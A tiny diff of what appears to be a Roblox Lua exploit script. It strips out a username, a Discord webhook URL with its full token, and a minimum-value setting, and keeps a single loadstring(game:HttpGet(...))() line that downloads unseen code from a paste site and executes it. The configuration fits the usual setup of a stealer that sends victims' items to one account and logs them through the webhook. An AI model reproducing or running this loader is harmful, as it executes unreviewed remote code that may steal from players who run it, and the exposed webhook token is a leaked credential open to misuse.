@@ -1,6 +1,1 @@
-Username = "XxWayneGamer"
-Webhook = "https://discord.com/api/webhooks/1403374936294428702/OMjWFI3xF_nAHbz2k66ONW6vi6swIaMACwtdwSbZkJzmLiHgWFqNH8hdHMAIOGeX-Uc7"
-MinimumValue = 1
-
-
 loadstring(game:HttpGet("https://pastefy.app/ED996LW7/raw"))()
